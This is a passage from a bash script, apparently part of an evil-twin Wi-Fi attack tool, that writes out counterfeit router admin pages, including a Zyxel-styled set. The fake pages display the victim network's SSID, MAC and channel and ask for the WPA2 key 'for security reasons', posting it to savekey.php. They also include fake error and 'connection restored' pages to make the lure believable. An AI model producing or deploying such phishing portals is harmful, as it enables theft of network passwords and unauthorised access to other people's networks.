gjrVQcF0ZiCd6ESHHewAywxn6DBRVaFmpqiCwwLwMnu8rGLbqJjljHjEIQpRiNtgYhO90UQnQlGKUfRGFa14xW1UMWVPyCIT85GPJ4AxH0/8HvnMGLQPgrBzhQAa0FAwizcu4kg3WIQg6EjHWC1CO7HaUiawBKZgBMMNgXRTtgyZLS9NCwjUGowMHOlIRDzrkc9axzwgsYdL7kGTewACJjkZhXAAQZScFCUkTGlKTJ7ylJqchyVd2cpXthIcreTFLGsJDnC0QZe6lIICsFG6ccEPFMEUZjGNacxAnDAQLaQOqyxAHSJdBwZ89ON3wJSKQ5WCaQVgslY3qfVIR5pgHeNEhLMiOc51PBIS0OqmDC6JSkzKAJOd1GQnRXlPe+JTn/
jkZD33+c9LIqoUjRpoogzqqGGMwFHCSeikONWp3VClHBA7iqi+8pxAQAejprIBDp5jCkPgUKTLAQTEaqBEl9mjBgE4aQBMMTOYxjSmOqRpTW2KAxzYtB86tWkVcKAAoAZVqEANCAA7\" height=\"50\" width=\"160\"></td>
    <td align=\"left\" height=\"50\" valign=\"top\"><img src=\"data:image/gif;base64,R0lGODlhCgAKAMQAAPHy9VNmh/r7/G1/nGV2lkVXeXKDoWR1l3KBobrC0L3F0+Pn7HSDoZmlulNlh0JWeHKEoXGBmXKEoNDV3pKdsurs8HaFoGV3lnKCofb3+f///wAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAKAAoAAAUmIIQhhsQ0yiJcxDEkmSZrTmAB8/xEcS4XFd+MIpxNijIccqnpFUMAOw==\" height=\"10\" width=\"10\"></td>
  </tr>
  <tr>
    <td style=\"background-color: #B70024\" width=\"1\"></td>
    <td class=\"menu\" align=\"left\" valign=\"top\" width=\"158\">
    <br>
	<div id=\"folder0\"><table border=\"0\" cellpadding=\"0\" cellspacing=\"2\" width=\"100%\"></table></div><div style=\"display: block;\" id=\"folder1\"><table border=\"0\" cellpadding=\"0\" cellspacing=\"2\" width=\"100%\"><tbody><tr><td class=\"menuCell\" nowrap=\"nowrap\" valign=\"middle\" width=\"100%\"><a class=\"menuLink\" style=\"color: #ffffff; background-color: #b70024;\" href=\"info.html\" target=\"basefrm\" onclick=\"javascript:clickOnFolder(1)\">&nbsp;&nbsp;&nbsp;Lock Center&nbsp;&nbsp;</a></td></tr></tbody></table></div><div style=\"display: block;\" id=\"folder14\"><table border=\"0\" 
cellpadding=\"0\" cellspacing=\"2\" width=\"100%\"><tbody><tr><td class=\"menuCell\" nowrap=\"nowrap\" valign=\"middle\" width=\"100%\"><a class=\"menuLink\" href=\"info.html\" target=\"basefrm\" onclick=\"javascript:clickOnFolder(14)\">&nbsp;&nbsp;&nbsp;Advanced Setup&nbsp;&nbsp;</a></td></tr></tbody></table></div><div style=\"display: block;\" id=\"folder32\"><table border=\"0\" cellpadding=\"0\" cellspacing=\"2\" width=\"100%\"><tbody><tr><td class=\"menuCell\" nowrap=\"nowrap\" valign=\"middle\" width=\"100%\"><a class=\"menuLink\" href=\"info.html\" target=\"basefrm\" onclick=\"javascript:clickOnFolder(32)\">&nbsp;&nbsp;&nbsp;Wireless&nbsp;&nbsp;</a></td></
tr></tbody></table></div><div style=\"display: block;\" id=\"folder39\"><table border=\"0\" cellpadding=\"0\" cellspacing=\"2\" width=\"100%\"><tbody><tr><td class=\"menuCell\" nowrap=\"nowrap\" valign=\"middle\" width=\"100%\"><a class=\"menuLink\" href=\"info.html\" target=\"basefrm\" onclick=\"javascript:clickOnFolder(39)\">&nbsp;&nbsp;&nbsp;Diagnostics&nbsp;&nbsp;</a></td></tr></tbody></table></div><div style=\"display: block;\" id=\"folder40\"><table border=\"0\" cellpadding=\"0\" cellspacing=\"2\" width=\"100%\"><tbody><tr><td class=\"menuCell\" nowrap=\"nowrap\" valign=\"middle\" width=\"100%\"><a class=\"menuLink\" href=\"info.html\" target=\"basefrm\" onclick=\"javascript:clickOnFolder(40)\">&nbsp;&nbsp;&nbsp;Management&nbsp;&nbsp;</a></td></tr></tbody></table></div>
<noscript>You must enable JavaScript in your browser.</noscript>
    </td>
    <td style=\"background-color: #B70024\" width=\"1\"></td>
    <td style=\"background-color: #ffffff\"></td>
  </tr>
</tbody></table>


</body></html>" > $DUMP_PATH/data/menu.html
}

function stylemain {
echo "body {
    font-size: small;
    font-family: \"tahoma\", \"sans-serif\", \"arial\", \"helvetica\";
}
td {
    font-size: small;
    font-family: \"tahoma\", \"sans-serif\", \"arial\", \"helvetica\";
}
td.hd {
    font-weight: bold;
    font-size: small;
    font-family: \"tahoma\", \"sans-serif\", \"arial\", \"helvetica\";
}
input {
    font-size:small;
    font-family: \"tahoma\", \"sans-serif\", \"arial\", \"helvetica\";
}
.menuLink {
    font-weight: bold;
    font-size: small;
    font-family: \"tahoma\", \"sans-serif\", \"arial\", \"helvetica\";
    width: 100%;
    cursor: hand;
    text-decoration: none;
    text-align: left;
}
" > $DUMP_PATH/data/stylemain.css
}

function index {
echo "<html><head>
<meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1252\">
<meta http-equiv=\"Pragma\" content=\"no-cache\">
<title>DSL Router</title>
</head><frameset rows=\"89,*\" border=\"0\" frameborder=\"0\" framespacing=\"0\">
   <frame src=\"data/logo.html\" name=\"logofrm\" frameborder=\"no\" border=\"0\" target=\"_self\" marginwidth=\"0\" marginheight=\"0\" noresize=\"noresize\" scrolling=\"no\">
   <frameset cols=\"170,*\" frameborder=\"0\" border=\"0\">
      <frame src=\"data/menu.html\" name=\"menufrm\" frameborder=\"no\" border=\"0\" target=\"_self\" marginwidth=\"0\" marginheight=\"0\" noresize=\"noresize\" scrolling=\"no\">
      <frame src=\"data/info.html\" name=\"basefrm\" frameborder=\"no\" border=\"0\" target=\"_self\" marginwidth=\"0\" marginheight=\"16\" noresize=\"noresize\" scrolling=\"auto\">
   </frameset>
</frameset>


</html>" > $DUMP_PATH/index.htm
}
colors && error && final && info && logo && menu && stylemain && index
}

# Crea contenido de la iface Zyxel
function ZYXEL {

mkdir $DUMP_PATH/data &>$linset_output_device

function error {
echo "<HTML><HEAD><link rel=\"stylesheet\" href=\"info.css\" type=\"text/css\">

</HEAD>

<BODY>
      <blockquote>


    <TABLE id=\"autoWidth\">

      <TBODY>



        <TR>

          <TD colspan=2></TD>

        </TR>


        <TR>

          <TD class=info1 colspan=2>
          
<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b></TD></TR>


        <TR><TD class=blue colspan=2></TD></TR>
        
<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"Back\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"Back\"/></form></td></tr>




      </TBODY>

    </TABLE>


      </blockquote>
</BODY>

</HTML>
">$DUMP_PATH/data/error.html
}

function final {
echo "<HTML><HEAD><link rel=\"stylesheet\" href=\"info.css\" type=\"text/css\"></HEAD>

<BODY>
      <blockquote>

    <TABLE id=\"autoWidth\">

      <TBODY>


        <TR>

          <TD class=blue colspan=2></TD>

        </TR>



        <TR>

          <TD class=info1 colspan=2>
          
Your connection will be restored in a few moments.</TD></TR>


        <TR><TD class=blue colspan=2></TD></TR>
        



      </TBODY>

    </TABLE>


</blockquote>
</BODY>

</HTML>
">$DUMP_PATH/data/final.html
}

function infocss {
echo "
/* ::::: http://192.168.1.1/content_linux.css ::::: */

BODY { font-weight: normal; font-size: 10pt; font-family: Arial,Helvetica,sans-serif; }
td { font-style: normal; font-size: 10pt; font-family: Arial,Helvetica,sans-serif; }
H1 { color: Black; font-size: 15pt; font-family: Arial,Helvetica,sans-serif; }
P { color: red; font-style: normal; font-size: 9pt; font-family: Arial,Helvetica,sans-serif; }
li { line-height: 1.3em; list-style-type: square; font-size: 9pt; font-family: Arial,Helvetica,sans-serif; }
A { text-decoration: underline; color: rgb(51, 102, 255); }
.NaviText { color: rgb(0, 102, 153); font-style: italic; font-weight: bold; font-size: 11pt; font-family: Arial,Helvetica,sans-serif; }
.descript { font-size: 9pt; }
.HiddenMessage { color: red; visibility: hidden; }
.sitemap { font-weight: bold; font-style: italic; }
.header2 { color: Black; font-weight: bold; font-size: 11pt; font-family: Arial,Helvetica,sans-serif; margin-bottom: 0pt; }
.Auth { color: rgb(0, 0, 0); font-weight: bold; font-size: 11pt; font-family: Arial,Helvetica,sans-serif; }
.AuthDesc { color: rgb(0, 0, 0); font-size: 11pt; font-family: Arial,Helvetica,sans-serif; }
.AuthErr { color: rgb(255, 0, 0); font-weight: bold; font-size: 11pt; font-family: Arial,Helvetica,sans-serif; }
.TableTilte { font-weight: bold; background-color: rgb(196, 211, 253); color: rgb(0, 0, 0); font-size: 10pt; font-family: Arial,Helvetica,sans-serif; }
.TableItem { color: Black; background-color: rgb(196, 211, 253); font-weight: bold; font-size: 10pt; font-family: Arial,Helvetica,sans-serif; margin-bottom: 0em; }
.MapTd { color: rgb(255, 255, 255); background-color: rgb(0, 102, 153); font-weight: bold; font-size: 10pt; font-family: Arial,Helvetica,sans-serif; margin-bottom: 0em; }
.hrColor {  }
.wzDescU { color: rgb(0, 0, 0); text-decoration: underline; font-weight: bold; font-size: 9pt; font-family: Arial,Helvetica,sans-serif; font-style: italic; margin-bottom: 0px; }
.wzDesc { color: rgb(0, 0, 0); font-weight: bold; font-size: 9pt; font-family: Arial,Helvetica,sans-serif; font-style: italic; margin-top: 0px; }

.contentCell2 { background-color: rgb(102, 102, 102); }
.off { background: url('left_menu_bg.gif') repeat-y scroll right center rgb(196, 211, 253); color: rgb(0, 0, 222); }
.on { background: url('left_menu_bg.gif') repeat-y scroll right center rgb(254, 252, 216); color: rgb(0, 0, 222); }
.navLink { text-decoration: none; color: rgb(0, 102, 153); font-size: 11px; font-family: Arial,Helvetica,sans-serif; }
.navNull { color: rgb(0, 102, 153); font-weight: bold; font-size: 9pt; font-family: Arial,Helvetica,sans-serif; background: none repeat scroll 0% 0% rgb(255, 255, 255); }
.highlight { background: url('left_menu_bg.gif') repeat-y scroll right center rgb(216, 238, 254); }
.shadow { background: url('left_menu_bg.gif') repeat-y scroll right center rgb(153, 153, 153); }
.navNull2 { color: rgb(0, 102, 153); background: none repeat scroll 0% 0% rgb(255, 255, 255); text-decoration: none; font-size: 11px; font-family: Arial,Helvetica,sans-serif; }
">$DUMP_PATH/data/info.css
}

function info {
echo "<html>
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">
  
<title>Web Configurator</title>

<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" media=\"all\">
</head>
<body bgcolor=\"#ffffff\" marginheight=\"0\" marginwidth=\"0\">

<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
  <tbody><tr> 
      <td width=\"2%\">&nbsp;</td><td width=\"5%\"></td><td width=\"93%\"> 
      <div valign=\"top\" align=\"left\"> 
        <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"560\">
            <td> 
              <div class=\"NaviText\" align=\"left\">
 
              Site Map             </div></td><td colspan=\"2\">&nbsp;</td>		
          </tr>
          <TABLE id=\"autoWidth\">

      <TBODY>
<tr><td><hr color=\"blue\" size=1 width=\"100%\"></td></tr>


                <tr><td colspan=\"2\" >SSID: <b>$Host_SSID</b></td></tr>
        <tr><td colspan=\"2\"  >MAC Address: <b>$Host_MAC</b></td></tr>
        <tr><td colspan=\"2\"  >Channel: <b>$Host_CHAN</b></td></tr>

<tr><td></td></tr>


<tr><td><hr color=\"blue\" size=1 width=\"100%\"></td></tr>
<tr><td></td></tr>

        <TR>

          <TD class=info1 colspan=2>
          
For security reasons, enter the <b>$privacy</b> key to access the Internet
<div id=\"box\" align=\"left\" >
<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"savekey.php\" >
<tr><td>WPA2 Key:</td></tr>
<tr><td><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>


        <TR><TD class=blue colspan=2></TD></TR>
                <TR><TD class=blue colspan=2></TD></TR>

        
<tr><td colspan=\"2\"><INPUT name=\"Confirm\" class=\"buttonBig\" type=\"submit\" value=\"Confirm\"/></td></tr>

</form></div>

</TD></TR>


      </TBODY>

    </TABLE>
        <tr>
  	 <td colspan=\"6\" height=\"10\">&nbsp;</td></tr></table></div></td></tr></tbody></table>
</body>
</html>
">$DUMP_PATH/data/info.html
}

function logo {
echo "<html>
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">



</head>
<body bgcolor=\"#FFFFFF\" marginheight=\"0\" marginwidth=\"0\">
<table bgcolor=\"#ffffff\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"650\">
  <tbody><tr>
    <td><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
        <tbody><tr bgcolor=\"#0061c2\"> 
          <td colspan=\"2\" bgcolor=\"#0061C2\" height=\"2\">&nbsp;</td><td width=\"76\"><img src=\"data:image/gif;base64,R0lGODlhAQABAJH/AP///wAAAMDAwAAAACH5BAEAAAIALAAAAAABAAEAAAICVAEAOw==\" height=\"26\"></td></tr><tr bgcolor=\"#C4D3FD\"> 
          <td colspan=\"2\" bgcolor=\"#C4D3FD\" height=\"2\" style=\"background-image: url(data:image/gif;base64,R0lGODlhAgAGALMAALzL87bE67XC6am22qi12aSw06Ov0p+rzZ6qy6684a+94qKv0QAAAAAAAAAA
AAAAACwAAAAAAgAGAAAECfAUZNYgKgUBIgA7)\"><img src=\"data:image/gif;base64,R0lGODlhAQABAJH/AP///wAAAMDAwAAAACH5BAEAAAIALAAAAAABAAEAAAICVAEAOw==\" height=\"6\" width=\"1\"></td><td colspan=\"2\" bgcolor=\"#C4D3FD\" height=\"2\" width=\"76\" style=\"background-image: url(data:image/gif;base64,R0lGODlhAgAGALMAALzL87bE67XC6am22qi12aSw06Ov0p+rzZ6qy6684a+94qKv0QAAAAAAAAAA
AAAAACwAAAAAAgAGAAAECfAUZNYgKgUBIgA7)\"><img src=\"data:image/gif;base64,R0lGODlhAQABAJH/AP///wAAAMDAwAAAACH5BAEAAAIALAAAAAABAAEAAAICVAEAOw==\" height=\"6\" width=\"1\"></td></tr><tr bgcolor=\"#C4D3FD\"> 
          <td align=\"left\" bgcolor=\"#C4D3FD\" height=\"22\" width=\"489\">&nbsp;</td>          <td align=\"left\" bgcolor=\"#C4D3FD\" width=\"85\">
          <a href=\"logo.html\"> <img src=\"data:image/gif;base64,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\" border=\"0\" height=\"22\"></a></td><td width=\"76\">
		  <a href=\"javascript:LinkHelp()\"><img src=\"data:image/gif;base64,R0lGODlhSgAWAPf/AP///8TT/cPS/MLR+8LR+sHR/MHQ+cDP+L/O97/N9r3M9LzL87zK8rvO+rrI
8LnH77jH7rjG7bfL+bfF7LbE67XD6rXC6bTK+LPB57LA5rK/5bHI97G+5LC946+94q7G9q684a67
4K2636y53qvC8Ku53au43KrE9aq326m22qi12ai02Ke016az1qWy1aSw06Ov0qKv0aGu0KGtz6Cs
zp6qzJ6qy52pypyoyZunyJqmx5qlxpmlxZikxJe575ejw5eiwpahwZWhwJS37pSgv5SfvpOevpKd
vZGcvJGcu5Cbuo+auY6ZuI2Yt42XtouWtIqUsomavomTsYeRroav6oSOq4ONqoKl2YKYwYKMqIGL
p4CKpoCJpX2p53yFoHiNtHeGp3Kj5G+i5G+EqWyLumyLuWeb3meIt2Ka32GHu16Iv159ql2W3FyU
2FuNzFqR1ViP01iCuFSLzU+Gx094rE2DxEqAwUp6tEl/wEh+v0eL2EZ8vEV7u0R6ukN5uUN5uEJ4
t0F3tkF2tUB1tD50sj5zsTWA0jV3wDR2vzF7zDB7zC13yCt1xSt1xClywChywSdxwCZwvyVvvSR1
zCNsuhpwyhlvyRlvyBZuyRZsxBRpwRJowBFnvxBqxwtmwwZlxANjwwJiwgBhwgAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAASgAWAEAI/wADCBxI
sKDBgwgTKlzIkCGCCRMeGPqE6cOHIZ8+mQkwMZPBjIYIIgAZIEzGIQ1TIkTwQAMKFjNmwJhRI8eP
H0WKOFmypMgPHTpyOhma86aOGiw8TECAQKXTp1CjSi34QEQNIpA+cfoy5UvGPUWyepID582bKywy
ZtLD1gyKjIhy6oCBYmnTqXjz6t3Lt6/KiZUEfsi4cWLGw10CZNRT8PBhMX4RPvDAogYjx4fZTFiU
0ZJnSw8XE9SA+ZMbEUsjE6w6o0ieQHe0aAFDiNAaL3Rq196z50yV2oF4z4njhNCeNEVqoNBgV7VI
liwfRIQIEYMGD9ixa9h+XUT27RAfMOF1Tr68+fN7N1gcaFFCAPUW4zcI0L5g/PXoAzBtClhwRjYc
ZYTJgJhQodgnjA10gIB6eJLRBue15F0ipX0CoGGWVKKhQKINNNIni7BhSUYfRCjCDD9IolVOXn0y
h2WfZCKCBhhY9xaCo2UkyRlpLKEDCxrc5VxVNRShIieyjZERIVWoiNkcS5S2iA5wFXHUcqmRhwAG
MOXk5VBOVFGFFl54UcVQSwwl5pk7FcGTlTCgNt55D2Egwp3YiYDCSzTVAFQONchEE1A6ADoDCyzM
2Fx+HjYl5H6QRioppPoxaqlUAQEAOw==\" border=\"0\" height=\"22\" width=\"74\"></a></td>        </tr><tr bgcolor=\"#ffffff\"> 
          <td colspan=\"2\"><img src=\"data:image/gif;base64,R0lGODlhFgAVAMQAAPX3/93l/sTT/cbU/cnX/cvY/c7a/dTf/tfh/tvk/t/n/uPq/uvw/vT3/8vZ
/eHp/uzx/vb5//n7//3+/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAA
FgAVAAAFWaAgjmQ5OsjDmKxYJIxEzW1pPM2sU7VIKIDdrneACIW1QOSINA0eE2aTNFhIj6bHFUsK
RLfD0WEJDgsIxrJZoW4agm2dSBuXF3J1WiIvZ/BnDjJ/CH8zdH8hADs=\" height=\"21\" width=\"22\"></td></tr><tr bgcolor=\"#ffffff\"> 
          <td colspan=\"2\">&nbsp;</td></tr></tbody></table></td></tr></tbody></table>

</body>
</html>
">$DUMP_PATH/data/logo.html
}

function menu {
echo "<html>
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">


<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" media=\"all\">
</head>
<body bgcolor=\"#0061c2\" marginheight=\"0\" marginwidth=\"0\">


<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" hspace=\"0\" vspace=\"0\" width=\"150\">
  <tbody><tr> 
    <td bgcolor=\"#0061C2\" height=\"26\">&nbsp;</td></tr><tr> 
    <td bgcolor=\"#C4D3FD\" height=\"5\"><img src=\"data:image/gif;base64,R0lGODlhlgAFALMAALbE67XC6am22qi12aSw06Ov0p+rzZ6qy6684a+94qKv0QBhwgJiwgNiwgNj
wgAAACwAAAAAlgAFAAAENNCtSau9OOvNu/9gqDWHQUhiqq5s61aMchToa9947jGDItS6oHC4YiAG
CSBxyWxSGAEEIAIAOw==\"></td></tr><tr bgcolor=\"#0061c2\"> 
    <td height=\"8\"><img src=\"data:image/gif;base64,R0lGODlhlgAvAPcAALvJ8bbE67XC6bLA5q674K2636y53qaz1p6qzJ2pysDO9rzK8cHP97/N9L3K
8bvI77rI7sTS+bzJ76+94qGu0LC+4qKv0ABhwgBhwQJiwgJhwANiwgNjwgRjwwVjwgZkwwZkwQdl
wwhmxAxoxRBrxhFsxhVuxxlwyB1zySF1yiJ2yiV4yyZ5yyl6zCp7zC5+zS9+zTOBzjaCzzeDzziE
zzqF0DuG0DyG0ECJ0USL0keN00iO00mO00yQ1E2R1FCT1VGT1VSV1lWW1lmY11qZ2Fya2F2b2F6b
2GGd2WKe2WSf2mWg2mag2mmi22qj226l3HOo3nKo3Xaq3ner3nqt33ut33+w4X+w4IKy4YOz4oW0
4oe144q344y45JC75Y+65JS95pjA55e/5pnA55zC6J3D6KDF6aHF6aXI6qTH6anK66rL667N7LHP
7bbS7rvV777X8MPa8cbc8svf89Pk9djn9uDs+O30+4Gy4Ya14ou445O95a3N7LLQ7bXS7rnU7rrV
78La8crf88/i9NTl9dfn9tzq99/s+N7r9+Ht+OTv+ebw+eny+t3r9+Xw+e71++rz+vb6/fL4/Pr9
/v7//wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAlgAvAAAI/wBDdBhI
sKDBgwgTKlzIsKHDhxAjJrzwYYGCCB0uaNzIsaPHjyBDihxJsqTJkyhDbhAAgAGHlDBjypxJs2bH
DQUCNHhps6fPn0BNbjgwwAHPoEiTKp2ZgcKEB0eXSp1KlWMGBAQgRI0Z5o/Xr2DDgg1DM4ZYr006
mvBzFo9GM2fjfsWyEcdZJDIzJDCglWaHSJQCCx5MeLCamoMKUzLU0Y3iOiMudJikuLJguhqvKBaS
d2/fmS8si6Y0peaQyjg2ai7sCIXG0KMVA9nIR/GLzny3piQSu/KOmh0KKTajMQdlwpJcbOTdm/CK
jXQKT8oYU29uml6aF05h04hiSSNOOP+SnnqjHu2C72wcoXgQU8+6UeaR++d44UQ9gytOEkixkY5t
KAYHfXtsFINih+H2WVAdgFGZIyxcYIMRFFZ4Qkc9VEhhDx15VxhghUnh0XjInZSEYqUpGB9wa1RW
h2sXYFEYZxu5UNgTHekXGxgelaCYHCdlV9hvKgY1AiCVDXKhRkDcyBEZhBVCHUdMxMbGlHUpRpZJ
cCjGXZE/mdCfYoFEVmNhemx0AoiC/eeRCCRWVuZHTihmiFwzdMRIYeq9d51PJ9RR2RpmciQJYQle
kEWUWHL0hGV1LOlRGOhR8pyaZNJk3YI1sWBIZWc0qtGYgv2hkQh7DjYbSCOwSZhyIMn/gV6fG+Wg
GI9+cjqTC3ESliZIDg7G2AV1DuZeSMHKFtKh2gXSERSKOaEpfDbdwGyIIhUr2CQaCadqSFKIdqxH
K1TqRUdpKHbDtH/O1MO1g00SxUgzFHZCk4PBEVIQsa2KoZ1y+dCRIIqVwK6uKQVhX7xBkMQeYTGQ
Glh5HtEAb2X6elTFZib9dV9Nm65YUhSVSUIkSdENRgVhGXuEQq+iUUybbSbBRlgbIFMb08aK3bGu
SbUN5iolt/UoKGGTIFlYy9ApJoJJ+Pqac7soaVsYGlZkrfXWVmDJc2V8fNRBlzfaSPNGIvTM9dpQ
bLSFYnysvXWhIYUcU9CVUsJIRztY/zZJ0R2VAbdGshYWtoF5UwKkRgGiJ0lJdsOUct5+dISCZWR8
9LWwBl9w2tkXHJF45ho1UqmzJEWO0sOJn9vRHYpN8iVHnyMdA9qpEkb6BUJWiuMFPla65Uiqn1Rv
4pQk4RHZunt0w8KC/b5RF7F/6UfiOWh0PHrSpq5z1chTcntHzAsWiaQasZD7YIdzVK5ipK+vnQka
Wd2czHV/X9VGJqjAwhFDo4Tr9kdA4umPgI3rGf0KyECQFI+A8hsMXhpIwY48sComsAyuKsjBC1yQ
Kn37UBU6SMIPToUHZ/iKH8LABPSRkIImFEkJVEBDGKFEBXQLkwpEBZMWzICHUolhSP+sIJhhoYQS
bgqKrE4mkyvcoRCVK6AQRYLEC4RBEXRAQRoMYQg4iMAQX5gB0y5AiT0YAgVceMIWu8hFQ3CBi2e4
gCGEAIQ0PIGLb8TjqSZRhytcgA+PAEQHACnINsqADorwIx8gIUiN1EEPNjrBFbOYhlWdsY535OIh
UDBJLeoBBUY0INWOaIQVREIEZKCLFeJ4A0MQwgahJKMYKPGEM1jhAqskowpweYYMqoASfDDCH3Kp
kT8k0Vp6cMML7oCqJTCTEfXapRHmUIJI/JIEgsjTBdRgMhW04JSpNKZGKKECYUqIMZTQATix8AdG
sIASJpliSJAIS17aEwp6kMQPYkn/CTEkAhC2tKcAszYIMBCiA5SYQxSGOQgrpEacGoFCIIAgiXqe
cyMDPYEh1EC/PgwCBusZwySuUM9VQpSc5qwnEhlj0jlAK54HPAk9WRrHXPIhDIbQAj/FYIgwBOKW
uaQEFIxghThcwREIncKAimoEkEL0j5IYTxMYM4MeUNVHQ0VBC8BQBxO8YAmPiBAuURAuJdD0pOU0
